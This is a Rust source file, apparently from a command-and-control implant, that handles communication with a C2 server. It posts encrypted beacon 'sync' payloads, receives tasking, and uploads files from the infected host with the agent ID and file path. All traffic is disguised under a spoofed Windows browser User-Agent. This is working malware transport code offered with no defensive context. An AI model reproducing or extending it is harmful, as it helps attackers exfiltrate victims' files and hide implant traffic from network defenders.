/// HTTPS transport — POST sync payloads to the C2 server, handle responses.

use serde::{Deserialize, Serialize};

#[derive(Serialize)]
struct SyncRequest {
    session: String,
    ts: i64,
}

#[derive(Deserialize)]
struct SyncRawResponse {
    data: String,
    ts: i64,
}

/// Send an encrypted sync request to the server and return the decrypted response bytes.
pub fn sync_post(server_url: &str, encrypted_payload: &str) -> Result<String, String> {
    let url = format!("{}/api/v1/sync", server_url.trim_end_matches('/'));
    let ts = chrono::Utc::now().timestamp();

    let req_body = SyncRequest {
        session: encrypted_payload.to_string(),
        ts,
    };

    let resp = ureq::post(&url)
        .set("Content-Type", "application/json")
        .set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .send_json(serde_json::to_value(&req_body).map_err(|e| format!("json: {}", e))?)
        .map_err(|e| format!("http: {}", e))?;

    let raw: SyncRawResponse = resp.into_json().map_err(|e| format!("response json: {}", e))?;
    Ok(raw.data)
}

/// Upload a file to the server via multipart POST.
pub fn upload_file(server_url: &str, agent_id: &str, filepath: &str, data: &[u8], filename: &str) -> Result<(), String> {
    let url = format!("{}/api/v1/upload", server_url.trim_end_matches('/'));

    // Build multipart body manually using ureq
    let boundary = format!("----FormBoundary{}", uuid::Uuid::new_v4().to_string().replace('-', ""));
    let mut body = Vec::new();

    // agent_id field
    body.extend_from_slice(format!("--{}\r\n", boundary).as_bytes());
    body.extend_from_slice(b"Content-Disposition: form-data; name=\"agent_id\"\r\n\r\n");
    body.extend_from_slice(agent_id.as_bytes());
    body.extend_from_slice(b"\r\n");

    // filepath field
    body.extend_from_slice(format!("--{}\r\n", boundary).as_bytes());
    body.extend_from_slice(b"Content-Disposition: form-data; name=\"filepath\"\r\n\r\n");
    body.extend_from_slice(filepath.as_bytes());
    body.extend_from_slice(b"\r\n");

    // file field
    body.extend_from_slice(format!("--{}\r\n", boundary).as_bytes());
    body.extend_from_slice(
        format!(
            "Content-Disposition: form-data; name=\"file\"; filename=\"{}\"\r\n",
            filename
        )
        .as_bytes(),
    );
    body.extend_from_slice(b"Content-Type: application/octet-stream\r\n\r\n");
    body.extend_from_slice(data);
    body.extend_from_slice(b"\r\n");

    // End boundary
    body.extend_from_slice(format!("--{}--\r\n", boundary).as_bytes());

    ureq::post(&url)
        .set(
            "Content-Type",
            &format!("multipart/form-data; boundary={}", boundary),
        )
        .set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .send_bytes(&body)
        .map_err(|e| format!("upload: {}", e))?;

    Ok(())
}
